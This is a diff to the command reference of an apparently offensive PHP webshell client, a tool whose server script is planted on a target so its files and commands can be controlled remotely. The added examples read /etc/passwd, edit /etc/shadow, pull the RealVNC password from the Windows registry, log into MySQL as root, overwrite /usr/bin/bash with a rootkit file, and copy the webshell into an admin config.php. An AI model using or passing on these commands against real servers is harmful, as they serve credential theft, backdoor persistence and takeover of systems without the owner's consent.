@@ -53,18 +53,22 @@ The php server script must be uploaded on the server to be controlled. Then you 
       Description : Show current help messages.
      ──────────────────────────────────────────────────
       Command     : connect [url]
+      Example     : connect http://127.0.0.1/server.php
       Status      : stable
       Description : Connect to Server WebShell script.
      ──────────────────────────────────────────────────
       Command     : cat [file path]
+      Example     : cat /etc/passwd
       Status      : stable
       Description : Show the content of remote file.
      ──────────────────────────────────────────────────
       Command     : tail [file path]
+      Example     : tail /var/log/secure
       Status      : unimplemented
       Description : Read the last lines of specific file.
      ──────────────────────────────────────────────────
       Command     : cd [directory]
+      Example     : cd /home/
       Status      : stable
       Description : Navigate to specific remote directory.
      ──────────────────────────────────────────────────
@@ -73,62 +77,77 @@ The php server script must be uploaded on the server to be controlled. Then you 
       Description : Show the full info of the System Operative of the server.
      ──────────────────────────────────────────────────
       Command     : exec [command]
+      Example     : exec reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
       Status      : stable
       Description : Execute a simple command in remote server using the current remote path. Detect automatic available method on the server. See the force-exec command.
      ──────────────────────────────────────────────────
       Command     : force-exec [method] [command]
+      Example     : force-exec passthru reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
       Status      : stable
       Description : Force execute a simple command in remote server using an specific php method in current path. Available methods: system, exec, shell_exec, passthru, popen, proc_open, explicit (using double quotes ``).
      ──────────────────────────────────────────────────
       Command     : edit [editor command] [remote file path]
+      Example     : edit vi /etc/shadow
       Status      : unimplemented
       Description : Edit remote file with specific local command edtor
      ──────────────────────────────────────────────────
       Command     : nano [remote file path]
+      Example     : nano /etc/shadow
       Status      : unimplemented
       Description : Edit remote file with nano editor on the local system.
      ──────────────────────────────────────────────────
       Command     : vi [remote file path]
+      Example     : vi /etc/shadow
       Status      : unimplemented
       Description : Edit remote file with vi editor on the local system.
      ──────────────────────────────────────────────────
       Command     : vim [remote file path]
+      Example     : vim /etc/shadow
       Status      : unimplemented
       Description : Edit remote file with vim editor on the local system.
      ──────────────────────────────────────────────────
       Command     : gedit [remote file path]
+      Example     : gedit /etc/shadow
       Status      : unimplemented
       Description : Edit remote file with gedit editor on the local system.
      ──────────────────────────────────────────────────
       Command     : notepad [remote file path]
+      Example     : notepad /etc/shadow
       Status      : unimplemented
       Description : Edit remote file with notepad.exe editor on the local system (only on local windows systems).
      ──────────────────────────────────────────────────
       Command     : sublime [remote file path]
+      Example     : sublime /etc/shadow
       Status      : unimplemented
       Description : Edit remote file with sublime editor on the local system.
      ──────────────────────────────────────────────────
       Command     : mysql [host] [port] [user] [password]
+      Example     : mysql localhost 3306 root 123456
       Status      : unimplemented
       Description : Start an interative MySQL session
      ──────────────────────────────────────────────────
       Command     : mysqldump [host] [port] [user] [password] [local file]
+      Example     : mysql localhost 3306 root 123456 ./dump.sql
       Status      : unimplemented
       Description : Make a dump from remote database to local SQL file
      ──────────────────────────────────────────────────
       Command     : download [remote path] [local path]
+      Example     : download /home/site/public_html ./backup
       Status      : unimplemented
       Description : Download a backup of file or directory from server to local path. If path finish with "/" download the content of folder (like as rsync). Not need a ssh access.
      ──────────────────────────────────────────────────
       Command     : upload [local path] [remote path]
+      Example     : upload ./rootkit.bin /usr/bin/bash
       Status      : unimplemented
       Description : Upload a local file or directory to remote directory (maintains the same permits)
      ──────────────────────────────────────────────────
       Command     : mkdir [remote path]
+      Example     : mkdir /tmp/backup/
       Status      : stable
       Description : Make a directory on the server.
      ──────────────────────────────────────────────────
       Command     : rm [remote path]
+      Example     : rm /tmp/backup/
       Status      : stable
       Description : Delete the specific file or directory path.
      ──────────────────────────────────────────────────
@@ -153,6 +172,7 @@ The php server script must be uploaded on the server to be controlled. Then you 
       Description : Show the current local path on the server.
      ──────────────────────────────────────────────────
       Command     : install [remote file path]
+      Example     : install /home/website/public_html/admin/config.php
       Status      : stable
       Description : Install a copy of the WebShell on the specific remote parh, if the directory does not exist, it will create it recursively.
      ──────────────────────────────────────────────────
